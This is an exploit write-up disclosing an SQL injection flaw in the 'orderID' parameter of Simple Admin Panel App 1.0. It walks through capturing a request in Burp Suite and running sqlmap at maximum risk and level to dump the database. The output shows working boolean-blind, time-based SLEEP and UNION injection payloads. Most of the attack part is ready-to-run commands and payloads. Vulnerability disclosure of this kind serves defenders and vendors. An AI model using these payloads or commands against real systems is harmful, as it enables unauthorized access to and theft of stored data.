# Simple Admin Panel App - SQL Injection
+ **Exploit Title:** Simple Admin Panel App - SQL Injection
+ **Date:** 2024-02-02
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/simple-admin-panel-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/e651c111-a5f1-45f6-ab1b-5fbf972339af
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Simple Admin Panel App 1.0 allows SQL Injection via the 'orderID' parameter at "/admin_panel/adminView/viewEachOrder.php?orderID=1". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/admin_panel"
+ Click on the orders button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /admin_panel/adminView/viewEachOrder.php?orderID=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: text/html, /; q=0.01
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'orderID' parameter to dump the database.
```
sqlmap -r r.txt -p orderID --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: orderID (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: orderID=1 AND 4498=4498

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: orderID=1 AND (SELECT 6307 FROM (SELECT(SLEEP(5)))oJSi)

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: orderID=1 UNION ALL SELECT 38,38,38,38,38,38,38,38,CONCAT(0x7162626b71,0x536b674d43546b476f7847795453696a73474c556b5055756751776747736c45614a6f63464e4850,0x71626b6a71)-- -
---
[20:01:07] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:01:07] [INFO] fetching current database
current database: 'swiss_collection'
```
+ current database: `swiss_collection`

![Ekran görüntüsü 2024-02-02 040908](https://github.com/BurakSevben/CVEs/assets/117217689/db1587ac-7b20-414d-9775-e8a63fb8eeb2)
